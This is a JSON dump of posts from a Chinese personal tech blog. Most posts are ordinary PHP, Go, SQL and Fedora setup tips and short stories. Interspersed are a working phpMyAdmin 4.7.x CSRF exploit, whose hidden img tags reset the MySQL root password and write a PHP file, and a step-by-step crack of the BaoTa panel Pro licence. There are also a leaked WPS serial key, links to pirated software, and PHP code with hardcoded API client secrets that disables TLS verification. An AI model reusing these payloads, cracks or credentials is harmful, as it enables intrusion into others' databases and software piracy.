\u0026#39;/r/\u0026#39; + Math.random(1); $.get(getvcurl, function (res) { if (res.status == 200) { // 这里写登入过后你执行的语句 } else if (res.status == 205 || res.status == 306) { getqrpic(); } else { } }, \u0026#39;json\u0026#39;); } 示例网站:http://www.chinawenshu.com\n","date":"2019-04-18T22:47:00Z","permalink":"https://blog.aaayun.cc/archives/372.html","title":"PHP实现QQ扫码登入，非开放平台"},{"content":"最近按照客户需求写一个支付异步回调通知url的需求,本想用curl写的,后来想想用file_get_contens是否可以实现,果然可以\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $data = array( \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;anderyly\u0026#39;, \u0026#39;age\u0026#39; =\u0026gt; \u0026#39;19\u0026#39;, \u0026#39;grade\u0026#39; =\u0026gt; \u0026#39;boy\u0026#39;, ); $query = http_build_query($data); $options[\u0026#39;http\u0026#39;] = array( \u0026#39;timeout\u0026#39; =\u0026gt; 60, \u0026#39;method\u0026#39; =\u0026gt; \u0026#39;POST\u0026#39;, \u0026#39;header\u0026#39; =\u0026gt; \u0026#39;Content-type:application/x-www-form-urlencoded\u0026#39;, \u0026#39;content\u0026#39; =\u0026gt; $query ); $url = \u0026#34;https://blog.aaayun/cc/\u0026#34;; $context = stream_context_create($options); $result = @file_get_contents($url, false, $context); ","date":"2019-04-09T18:39:00Z","permalink":"https://blog.aaayun.cc/archives/371.html","title":"PHP实现file_get_contents发送post请求"},{"content":"之前做直播系统,需要用到通信这一块,由于官方文档没有sdk,博主本人也是google的,顺便修改了一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 \u0026lt;?php namespace hx; class Hx { private $app_key = \u0026#39;1106196338107043#bfzb\u0026#39;; private $client_id = \u0026#39;YXA68gwqIDr4Eem08DO8sr_xCA\u0026#39;; private $client_secret = \u0026#39;YXA57if_NzYCtL_96DktWsvILrlcU24\u0026#39;; private $url = \u0026#34;https://a1.easemob.com/1106190228107043/bfzb\u0026#34;; /* * 获取APP管理员Token */ public function __construct() { $url = $this-\u0026gt;url . \u0026#34;/token\u0026#34;; $data = array( \u0026#39;grant_type\u0026#39; =\u0026gt; \u0026#39;client_credentials\u0026#39;, \u0026#39;client_id\u0026#39; =\u0026gt; $this-\u0026gt;client_id, \u0026#39;client_secret\u0026#39; =\u0026gt; $this-\u0026gt;client_secret ); $rs = json_decode($this-\u0026gt;curl($url, $data), true); $this-\u0026gt;token = $rs[\u0026#39;access_token\u0026#39;]; } /* * 注册IM用户(授权注册) */ public function hx_register($username, $password, $nickname) { $url = $this-\u0026gt;url . \u0026#34;/users\u0026#34;; $data = array( \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; $password, \u0026#39;nickname\u0026#39; =\u0026gt; $nickname ); $header = array( \u0026#39;Content-Type: application/json\u0026#39;, \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); return $this-\u0026gt;curl($url, $data, $header, \u0026#34;POST\u0026#34;); } /* * 给IM用户的添加好友 */ public function hx_contacts($owner_username, $friend_username) { $url = $this-\u0026gt;url . \u0026#34;/users/${owner_username}/contacts/users/${friend_username}\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); return $this-\u0026gt;curl($url, \u0026#34;\u0026#34;, $header, \u0026#34;POST\u0026#34;); } /* * 解除IM用户的好友关系 */ public function hx_contacts_delete($owner_username, $friend_username) { $url = $this-\u0026gt;url . \u0026#34;/users/${owner_username}/contacts/users/${friend_username}\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); return $this-\u0026gt;curl($url, \u0026#34;\u0026#34;, $header, \u0026#34;DELETE\u0026#34;); } /* * 查看好友 */ public function hx_contacts_user($owner_username) { $url = $this-\u0026gt;url . \u0026#34;/users/${owner_username}/contacts/users\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); return $this-\u0026gt;curl($url, \u0026#34;\u0026#34;, $header, \u0026#34;GET\u0026#34;); } /* 发送文本消息 */ public function hx_send($sender, $receiver, $msg) { $url = $this-\u0026gt;url . \u0026#34;/messages\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); $data = array( \u0026#39;target_type\u0026#39; =\u0026gt; \u0026#39;users\u0026#39;, \u0026#39;target\u0026#39; =\u0026gt; array( \u0026#39;0\u0026#39; =\u0026gt; $receiver ), \u0026#39;msg\u0026#39; =\u0026gt; array( \u0026#39;type\u0026#39; =\u0026gt; \u0026#34;txt\u0026#34;, \u0026#39;msg\u0026#39; =\u0026gt; $msg ), \u0026#39;from\u0026#39; =\u0026gt; $sender, \u0026#39;ext\u0026#39; =\u0026gt; array( \u0026#39;attr1\u0026#39; =\u0026gt; \u0026#39;v1\u0026#39;, \u0026#39;attr2\u0026#39; =\u0026gt; \u0026#34;v2\u0026#34; ) ); return $this-\u0026gt;curl($url, $data, $header, \u0026#34;POST\u0026#34;); } /* 查询离线消息数 获取一个IM用户的离线消息数 */ public function hx_msg_count($owner_username) { $url = $this-\u0026gt;url . \u0026#34;/users/${owner_username}/offline_msg_count\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); return $this-\u0026gt;curl($url, \u0026#34;\u0026#34;, $header, \u0026#34;GET\u0026#34;); } /* * 获取IM用户[单个] */ public function hx_user_info($username) { $url = $this-\u0026gt;url . \u0026#34;/users/${username}\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); return $this-\u0026gt;curl($url, \u0026#34;\u0026#34;, $header, \u0026#34;GET\u0026#34;); } /* * 获取IM用户[批量] */ public function hx_user_infos($limit) { $url = $this-\u0026gt;url . \u0026#34;/users?${limit}\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); return $this-\u0026gt;curl($url, \u0026#34;\u0026#34;, $header, \u0026#34;GET\u0026#34;); } /* * 重置IM用户密码 */ public function hx_user_update_password($username, $newpassword) { $url = $this-\u0026gt;url . \u0026#34;/users/${username}/password\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); $data[\u0026#39;newpassword\u0026#39;] = $newpassword; return $this-\u0026gt;curl($url, $data, $header, \u0026#34;PUT\u0026#34;); } /* * 删除IM用户[单个] */ public function hx_user_delete($username) { $url = $this-\u0026gt;url . \u0026#34;/users/${username}\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); return $this-\u0026gt;curl($url, \u0026#34;\u0026#34;, $header, \u0026#34;DELETE\u0026#34;); } /* * 修改用户昵称 */ public function hx_user_update_nickname($username, $nickname) { $url = $this-\u0026gt;url . \u0026#34;/users/${username}\u0026#34;; $header = array( \u0026#39;Authorization: Bearer \u0026#39; . $this-\u0026gt;token ); $data[\u0026#39;nickname\u0026#39;] = $nickname; return $this-\u0026gt;curl($url, $data, $header, \u0026#34;PUT\u0026#34;); } /* * * curl */ private function curl($url, $data, $header = false, $method = \u0026#34;POST\u0026#34;) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); if ($header) { curl_setopt($ch, CURLOPT_HTTPHEADER, $header); } curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method); if ($data) { curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data)); } curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); $ret = curl_exec($ch); return $ret; } } $rs = new Hx(); // 注册的用户 echo $rs-\u0026gt;hx_register(\u0026#39;qwerasd\u0026#39;, \u0026#39;qazwsx\u0026#39;, \u0026#39;福州123\u0026#39;); // 给IM用户的添加好友 // echo $rs-\u0026gt;hx_contacts(\u0026#39;admin888\u0026#39;, \u0026#39;qwerasd\u0026#39;); /* 发送文本消息 */ // echo $rs-\u0026gt;hx_send(\u0026#39;213123\u0026#39;,\u0026#39;admin888\u0026#39;,\u0026#39;dfadsr214wefaedf\u0026#39;); /* 消息数统计 */ // echo $rs-\u0026gt;hx_msg_count(\u0026#39;admin888\u0026#39;); /* 获取IM用户[单个] */ // echo $rs-\u0026gt;hx_user_info(\u0026#39;admin888\u0026#39;); /* 获取IM用户[批量] */ // echo $rs-\u0026gt;hx_user_infos(\u0026#39;20\u0026#39;); /* 删除IM用户[单个] */ // echo $rs-\u0026gt;hx_user_delete(\u0026#39;wwwwww\u0026#39;); /* 修改用户昵称 */ // echo $rs-\u0026gt;hx_user_update_nickname(\u0026#39;asaxcfasdd\u0026#39;,\u0026#39;网络科技\u0026#39;); /* 重置IM用户密码 */ // echo $rs-\u0026gt;hx_user_update_password(\u0026#39;asaxcfasdd\u0026#39;,\u0026#39;asdad\u0026#39;); /* 解除IM用户的好友关系 */ // echo $rs-\u0026gt;hx_contacts_delete(\u0026#39;admin888\u0026#39;, \u0026#39;qqqqqqqq\u0026#39;); /* 查看好友 */ //echo $rs-\u0026gt;hx_contacts_user(\u0026#39;admin888\u0026#39;); ","date":"2019-04-03T23:10:00Z","permalink":"https://blog.aaayun.cc/archives/369.html","title":"分享一个PHP环信服务端操作类"},{"content":"最近在研究golang,由于需要采集很多分类的数据配置文件写死不合适,何况还要编译成exe,查看了一下大佬以及官方文档,发现实现并不难\n1.首先导入包\n1 2 3 4 5 import( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;github.com/tidwall/gjson\u0026#34; ) 2.获取config.ini配置json的文件\n1 2 3 4 5 6 fp, _ := os.Open(\u0026#34;config.ini\u0026#34;) // 获取文件指针 defer fp.Close() fileInfo, _ := fp.Stat() buffer := make([]byte, fileInfo.Size()) _, _ = fp.Read(buffer) // 文件内容读取到buffer中 config := string(buffer) 3.获取json值,这里双引号的是与json相对应的,如果外面还有一层加个.就行啦\n1 2 page := gjson.Get(conf, \u0026#34;page\u0026#34;) fmt.Println(page.String()) 附上我的json\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;page\u0026#34;:\u0026#34;281\u0026#34;, \u0026#34;sleep\u0026#34;:\u0026#34;2\u0026#34;, \u0026#34;type\u0026#34;:\u0026#34;10\u0026#34;, \u0026#34;user\u0026#34; = \u0026#34;root\u0026#34;, \u0026#34;pass\u0026#34; = \u0026#34;root\u0026#34;, \u0026#34;network\u0026#34; = \u0026#34;tcp\u0026#34;, \u0026#34;host\u0026#34; = \u0026#34;localhost\u0026#34;, \u0026#34;port\u0026#34; = \u0026#34;3306\u0026#34;, \u0026#34;database\u0026#34; = \u0026#34;pjs\u0026#34; } ","date":"2019-04-03T18:10:00Z","permalink":"https://blog.aaayun.cc/archives/366.html","title":"golang配置文件加载"},{"content":"只需一条简单sql语句\n1 DELETE FROM ceshi WHERE id NOT IN (SELECT id from ( SELECT min(id) AS id FROM ceshi GROUP BY `name`,class)a) ","date":"2019-04-03T17:24:00Z","permalink":"https://blog.aaayun.cc/archives/365.html","title":"mysql删除重复记录只保留一条"},{"content":"{music id=\u0026ldquo;574566207\u0026rdquo; color=\u0026quot;#19facd\u0026quot; autoplay=\u0026ldquo;autoplay\u0026rdquo;/}\n宋徽宗二十年，一劫富济贫，看不惯贪官污吏，通过盗窃贪官钱财施予平民百姓的盗窃，在一次纵马逃城时带起一女子裙边，看官兵并未追来，就下马致歉，没想到一眼定情，便暗下决心不再为盗，取其为妻。\n天随人愿，大盗盗得了女子的心，共渡了三年神仙眷侣般的生活，陪女子小巷吃面，谈笑飞雪，还不惜用夜明珠做弹珠弹落山雀……\n公元1126年，大盗决定娶女子为妻，听闻南京王府有一玉簪，得之赠予心爱之人，可与其永世不分，大盗欲窃之，便辞别女子并道明数日后迎娶她，轻装踏上南京的路。待窃簪返途，听闻金军攻陷汴梁，一路烧杀抢掠，民不聊生，大盗马不停蹄赶回汴梁，心中期盼女子一切安好，却还是不得不接受她已命丧黄泉的现实，大盗肝肠寸断，悔不该留她一人在汴梁孤援无助，也恨自己盗即为盗，或许无论是否劫富济贫，终有报应。\n但一腔恨意无法消停，大盗就此弃盗从军，带着对女子的留恋，战场杀敌勇猛如虎，最终金军打败，大盗射杀了完颜克图，也因此被封为护国大将军，可于钱财官爵他终无眷恋，便于朝堂之上辞官返故，回到了之前和女子共渡的弄堂小巷，当起了说书人。\n每日堂前座无虚席，百姓都爱在大盗的“一笑轩”里听着他讲一个盗贼、一个将军和一个女子的故事，每每众人四散，却徒留这说书人后堂泪流满面，望着女子在庭院中种下的枇杷树，那支挂在树梢始终未送出的玉簪，那玉簪也讲述着大盗说尽生平事，却终究走不出自己的故事…\n","date":"2019-03-22T19:13:00Z","permalink":"https://blog.aaayun.cc/archives/360.html","title":"一首歌一个故事 | 盗将行（很凄美的一个故事）"},{"content":"首先安装面板免费版\n然后升级专业版\n1 wget -O update.sh http://download.bt.cn/install/update_pro.sh \u0026amp;\u0026amp; bash update.sh pro 找到路径/www/server/panel/class 找到文件名或者直接搜索：common.py\n搜索代码164行\n1 data = panelAuth().get_order_status(None) 替换成\n1 data = {\u0026#39;status\u0026#39; : True,\u0026#39;msg\u0026#39; : {\u0026#39;endtime\u0026#39; : 32503651199 }} 完成后，进入 /www/server/panel/data 新建一个文件 文件名为：userInfo.json 内容空的，如果存在这个文件的删掉重新新建文件\n最后重启宝塔\n1 /etc/init.d/bt restart 注意：安装前请关闭宝塔网页 防止错误 如果使用失败，请恢复成免费版 代码为\n1 wget -O update.sh http://download.bt.cn/install/update.sh \u0026amp;\u0026amp; bash update.sh free 本地玩下可以 运营请支持正版\n","date":"2019-03-16T22:44:00Z","permalink":"https://blog.aaayun.cc/archives/358.html","title":"宝塔专业版手动破解方法"},{"content":"1.先下载文件，下载后将后缀改为.c 点我下载\n安装 C/C++ 的编译环境和 gtk libgtk2.0-dev 1 2 # apt-get install build-essential # apt-get install libgtk2.0-dev 编译共享内库 1 # gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC 设置 LD_PRELOAD 并启动 Sublime Text 1 # LD_PRELOAD=./libsublime-imfix.so subl 修改 /usr/share/applications/sublime_text.desktop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 [Desktop Entry] [...] Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text %F [...] [Desktop Action Window] [...] Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text -n [...] [Desktop Action Document] [...] Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text --command new_file [...] 不要忘了把 libsublime-imfix.so 放到 /opt/sublime_text/ 中\n修改 /usr/bin/subl 1 2 export LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text \u0026#34;$@\u0026#34; 重启电脑，可以看到Sublime能够输入中文了。\n","date":"2019-02-14T22:23:00Z","permalink":"https://blog.aaayun.cc/archives/356.html","title":"解决linux下sublime3无法中文输入"},{"content":"“好想变成雪啊，这样就可以落在姑娘的肩上了……”\n“若是姑娘撑了伞呢？”\n“那就落在姑娘的红伞上，静载一路的月光。”\n“若是姑娘将雪拂去……”\n“那就任她拂去，能在她的手掌上停留一刻，便足矣。”\n","date":"2019-02-13T11:13:12Z","permalink":"https://blog.aaayun.cc/archives/328.html","title":"雪"},{"content":"因为版权，非开源等原因，官方未打包一些解码器，所以刚安装的chrome没法播放网页上的音乐\n解决方案就是安装解码器，不过需要添加rpmfusion的源\n1.进入rpmfusion官网( https://rpmfusion.org/Configuration )，可以看到两种安装方式，一种是Graphical Setup via Firefox web browser（通过firefox下载rpm包安装），另外一种是Command Line Setup using rpm（命令行安装），选一种安装即可。安装完成可以在/etc/yum.repos.d中看到如下的源：\nrpmfusion-free.repo rpmfusion-nonfree.repo\nrpmfusion-free-updates.repo rpmfusion-nonfree-updates.repo\nrpmfusion-free-updates-testing.repo rpmfusion-nonfree-updates-testing.repo\n2.安装解码器:执行以下命令即可：\n1 $ sudo dnf install gstreamer1-libav gstreamer1-plugins-ugly gstreamer1-plugins-bad-free gstreamer1-plugins-bad-freeworld gstreamer1-vaapi 或者直接用以下命令\n1 dnf install pavucontrol ","date":"2019-02-01T23:10:00Z","permalink":"https://blog.aaayun.cc/archives/325.html","title":"解决fedora下chrome播放音乐没有声音"},{"content":"点我下载rpm包\n进入命令行执行\n1 # dnf localinstall wps-office-10.1.0.6757-1.x86_64.rpm 这里我使用dnf localinstall而不使用rpm，因为需要解决依赖关系\n打开word会提示缺失字体，点击这里下载缺失的字体\n1 2 3 4 5 # mv wps_symbol_fonts /usr/share/fonts/ # cd /usr/share/fonts/ # mkfontscale # mkfontdir # fc-cache 完成后寻找.doc/.docx/.ppt/.pptx/.exl/.exlx文件，右击属性 -\u0026gt;打开方式选择默认打开方式为WPS并设置为默认。至于其他缺少的黑体宋体楷体等等字体，从其他windows电脑的的字体文件夹里复制字体，粘贴到/usr/share/fonts/，重新执行上一步。\n","date":"2019-02-01T22:38:00Z","permalink":"https://blog.aaayun.cc/archives/321.html","title":"fedora29安装wps"},{"content":" 终端切换用户为超级用户root 添加Chrome浏览器的数据源 注意：Google Chrome Linux版本已经没有任何32位（x86）的更新，并且32位的库源也已被删除。如果您安装了32位版本，则可以使用它，但无法再获取安全更新或其他更新。\n运行以下命令（直接复制粘贴所有内容到控制台）来创建 /etc/yum.repos.d/google-chrome.repo 文件\n1 2 3 4 5 6 7 8 cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/yum.repos.d/google-chrome.repo [google-chrome] name=google-chrome - x86_64 baseurl=http://dl.google.com/linux/chrome/rpm/stable/x86_64 enabled=1 gpgcheck=1 gpgkey=https://dl.google.com/linux/linux_signing_key.pub EOF YUM安装Chrome浏览器\n3.1 安装稳定版本的Chrome浏览器 1 dnf install google-chrome-stable 3.1 安装测试版本的Chrome浏览器\n1 dnf install google-chrome-beta 3.1 安装不稳定版本的Chrome浏览器\n1 dnf install google-chrome-unstable ","date":"2019-02-01T21:57:00Z","permalink":"https://blog.aaayun.cc/archives/317.html","title":"Fedora26/27/28/29中安装Google Chrome浏览器"},{"content":"话不多说直接上代码\n1 2 3 4 5 6 7 8 \u0026lt;?php $str = file_get_contents(\u0026#39;http://cn.bing.com/HPImageArchive.aspx?idx=0\u0026amp;n=1\u0026#39;); if (preg_match(\u0026#34;/\u0026lt;url\u0026gt;(.+?)\u0026lt;\\/url\u0026gt;/ies\u0026#34;, $str, $matches)) { $imgurl = \u0026#39;http://cn.bing.com\u0026#39; . $matches[1]; } else { $imgurl = \u0026#39;修改为你自己的默认图片地址\u0026#39;; } header(\u0026#34;Location: $imgurl\u0026#34;); ","date":"2019-01-27T12:47:00Z","permalink":"https://blog.aaayun.cc/archives/314.html","title":"必应获取每日高清壁纸API代码"},{"content":"\n免费在线观看全网VIP影视接口文件，搭建属于自己的VIP影视接口网站，本源码为一次解析接口并非网上泛滥的二次解析\n安装方法：\n1.本源码解析需要自己拥有VIP会员账号并且去抓cookie数据 写入文件includeconfig.inc里 （COOkie自己用FD软件去抓取就是了！）\n2.请放置空间根目录，如果没有填写cookie vip视频播放不了，别等下评论说 “我上传了源码用不了” 那是你没有填cookie\n3.支持，优酷，爱奇艺，芒果TV，PPTV聚力，搜狐视频，腾讯视频，华数，M1905电影网，暴风影音，风行，CCTV，咪咕视频，天天看看，音悦台，哔哩哔哩，AcFun，美拍，秒拍，土豆，龙珠，虎牙直播，NOW直播，YY神曲，一直播，映客直播，360短视频，27盘等资源站，2MM恋恋影视，糖豆，梨视频\n4.主页地址为：http://你的域名/home.php\n5.解析调用：http://你的域名/?url=\n下载直通车\n","date":"2019-01-23T16:56:00Z","permalink":"https://blog.aaayun.cc/archives/307.html","title":"全网VIP影视一次解析接口源码文件分享"},{"content":"话说，今天做项目要求计算星座\n日期格式为2019-1-22\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 function get_xz($birthday) { $arr_day = explode(\u0026#39;-\u0026#39;, $birthday); $month = $arr_day[1]; $day = $arr_day[2]; if($month \u0026lt; 1 or $month \u0026gt; 12 or $day \u0026lt; 1 or $day \u0026gt; 31) return false; $xz_array = array( array(\u0026#34;20\u0026#34; =\u0026gt; \u0026#34;水瓶座\u0026#34;), array(\u0026#34;19\u0026#34; =\u0026gt; \u0026#34;双鱼座\u0026#34;), array(\u0026#34;21\u0026#34; =\u0026gt; \u0026#34;白羊座\u0026#34;), array(\u0026#34;20\u0026#34; =\u0026gt; \u0026#34;金牛座\u0026#34;), array(\u0026#34;21\u0026#34; =\u0026gt; \u0026#34;双子座\u0026#34;), array(\u0026#34;22\u0026#34; =\u0026gt; \u0026#34;巨蟹座\u0026#34;), array(\u0026#34;23\u0026#34; =\u0026gt; \u0026#34;狮子座\u0026#34;), array(\u0026#34;23\u0026#34; =\u0026gt; \u0026#34;处女座\u0026#34;), array(\u0026#34;23\u0026#34; =\u0026gt; \u0026#34;天秤座\u0026#34;), array(\u0026#34;24\u0026#34; =\u0026gt; \u0026#34;天蝎座\u0026#34;), array(\u0026#34;22\u0026#34;=\u0026gt;\u0026#34;射手座\u0026#34;), array(\u0026#34;22\u0026#34;=\u0026gt;\u0026#34;摩羯座\u0026#34;) ); foreach ($xz_array[(int)$month-1] as $xz_key =\u0026gt; $xz_name); if ($day \u0026lt; $xz_key) : foreach ($xz_array[($month-2 \u0026lt; 0)?$month = 11:$month -= 2] as $xz_key =\u0026gt; $xz_name); endif; return $xz_name; } ","date":"2019-01-23T00:08:12Z","permalink":"https://blog.aaayun.cc/archives/303.html","title":"php根据出生日期计算星座"},{"content":"\n防红短连接不得用于任何违反《中华人民共和国网络安全法》的网站\n防红短连接均由用户生成，轻风云防红不承担任何法律责任。\n防红短连接仅仅用于被误报毒，短暂提供防红访问服务。\nJG防红定期核查违法的链接并拉黑，并上报公安机关网络平台。\n若你发现防红短连接存在违法行为，请联系博主本人，我们将拉黑该域名，并上报公安系统。\n防红工具网站：https://url.qfy.kim/\n","date":"2019-01-21T18:31:00Z","permalink":"https://blog.aaayun.cc/archives/301.html","title":"轻风云防红免责声明"},{"content":"\n下载直通车\n","date":"2019-01-14T19:07:00Z","permalink":"https://blog.aaayun.cc/archives/293.html","title":"二次元导航网源码"},{"content":" Miko 整站源码\n1.解压源码，上传到空间\n2.把 zz04_net.sql 导入到数据库里\n3.后台：域名/admin.php\n4.后台密码修改：域名/tools.php 密码admin\n需要修改以下三个文件：\n/config/config_global.php\n/config/config_ucenter.php\n/uc_server/data/config.inc.php\n改一下数据库信息\n","date":"2019-01-02T19:04:00Z","permalink":"https://blog.aaayun.cc/archives/276.html","title":"Miko动漫视频网站整站源码+二次元动漫网源码+视频弹幕网+自带播放器数据下载"},{"content":" WHMCS为在线业务提供集用户管理、账单支付\u0026amp;帮助服务为一体的解决方案。以下是部分主要功能列表，还有很多功能尚未列出。\n支付功能 - 支持多种货币，缴纳税款， 一次性\u0026amp; 周期性发票，报价/预算 \u0026amp; 服务单帮助费用\n自动功能 - 付款处理，退款，欺诈检测，产品/域名供应 \u0026amp; 管理\n使用方便 - 简单\u0026amp; 直观的界面，速度快， 快速安装 \u0026amp; 帮助\n产品 - 提供免费，一次性 \u0026amp; 周期性， Prorata，自定义字段，欢迎邮件， 库存管理\u0026amp; 推广\n交易 - 支持50多种支付网关，收入/交易日志记录 \u0026amp; 统计报告\n帮助中心 -完整的服务单系统， 知识库，文件下载，系统通知\u0026amp; 网络故障工具\n模块 - 创建，暂停使用，终止，升级， SSL证书， 更新域名服务器，更新 \u0026amp; 等…\n可定制服务- 用户\u0026amp; 管理员专区模板， 订单表格，语言文件， \u0026amp; CSS设计\n可自行开发 - 模块开发工具，Action Hooks \u0026amp; 远程API\n下载地址 密码：rbfr\n","date":"2019-01-02T18:58:00Z","permalink":"https://blog.aaayun.cc/archives/273.html","title":"WHMCS v7.6.0 – 著名的虚拟主机管理脚本绿色版"},{"content":"经过测试后发布，资源来自网络。\n此为某地方ZF购买的正版序列号，可终身有效激活！\nTHUV2-32HH7-6NMHN-PTX7Y-QQCTH\nWPS Office Pro 2016 (10.8.0.6423)绿色精简版本\nhttps://pan.baidu.com/s/1kVyuw5p\nWPS Office Pro 2016 专业版 (10.8.0.6206) 官方下载地址\nhttp://wdl1.cache.wps.cn/wps/download/ep/WPS2016Pro_normal.exe\nWPS Office Pro Plus 2016 专业增强版 (10.8.0.6206) 官方下载地址（带 VBA）\nhttp://wdl1.cache.wps.cn/wps/download/ep/WPS2016ProPlus_normal.exe\n","date":"2018-12-28T21:47:00Z","permalink":"https://blog.aaayun.cc/archives/266.html","title":"WPS Office 2016 专业版/专业增强版/绿色精简版本"},{"content":"\n某大牛利用漏洞爬出来的：http://blog.hytcshare.com/post/tuwan-spider.html\n很多兔女郎、泳装、JK服等美女图片，感兴趣的兄弟转存一份\n网盘：https://pan.baidu.com/s/1Fv6kgkBvUwgdP09HjLyZUw 提取码: 9s3y\n","date":"2018-12-25T22:47:00Z","permalink":"https://blog.aaayun.cc/archives/262.html","title":"兔玩映画36.5G收费妹子图"},{"content":"修改root密码：\n保存为：webshell.html\n[HTML]\n1 2 \u0026lt;p\u0026gt;Hello World\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026#34;https://webshell.cc/sql.php?db=mysql\u0026amp;table=user\u0026amp;sql_query=SET%20password%20=%20PASSWORD(%27www.webshell.cc%27)\u0026#34; style=\u0026#34;display:none;\u0026#34; /\u0026gt; 密码为：www.webshell.cc\n写文件\n首先你要知道路径\n保存为：webshell.html\n[Bash shell]\n1 2 \u0026lt;p\u0026gt;Hello World\u0026lt;/p\u0026gt; \u0026lt;img src=\u0026#34;https://webshell.cc/sql.php?db=mysql\u0026amp;table=user\u0026amp;sql_query=select \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/test.php\u0026#39;;\u0026#34; style=\u0026#34;display:none;\u0026#34; /\u0026gt; ","date":"2018-12-22T22:05:00Z","permalink":"https://blog.aaayun.cc/archives/235.html","title":"phpMyAdmin 4.7.x CSRF 漏洞利用"},{"content":"吃鸡一般都要用加速器 现在腾讯的加速器已经开始收费了\n想免费使用网游加速的朋友可以试试这个软件\n注册免费送会员体验 软件注册非常简单 无需验证\n如果到期了就使用注册限制解除软件 注册新的号继续使用即可\n下载直通车\n","date":"2018-12-22T22:01:00Z","permalink":"https://blog.aaayun.cc/archives/234.html","title":"蜗牛网游加速器下载 破解注册限制 无限使用会员体验"},{"content":"就不截图了\n下载直通车\n","date":"2018-12-20T18:13:00Z","permalink":"https://blog.aaayun.cc/archives/231.html","title":"安卓老司机app-YY绿色版V8.0软件"},{"content":"接口地址：https://api.aaayun.cc/?type=Image\u0026file=TooPenRand\n实现很简单，如需要源码，请留言\n","date":"2018-12-14T01:41:00Z","permalink":"https://blog.aaayun.cc/archives/218.html","title":"PHP获取toopen性感美女随机图片，PHP接口"},{"content":"\n最近超火的支付宝扫码领赏金活动已经霸占了朋友圈和QQ群，还在发二维码和搜索码？\n演示站：https://pay.aaayun.cc/zfbhb\n下载直通车\n","date":"2018-12-14T00:49:00Z","permalink":"https://blog.aaayun.cc/archives/214.html","title":"最近很火的支付宝领红包引导页"},{"content":"接口地址：https://api.aaayun.cc/?type=Image\u0026file=QiHooRand\u0026cid=26\n参数cid可变:\n游戏人物：5 美女模特：6 影视：7 风景：9 时尚：10\n明星：11 汽车：12 萌宠：14 小清新：15 体育：16\n儿童：18 壁纸：29 爱情：30 文字：35 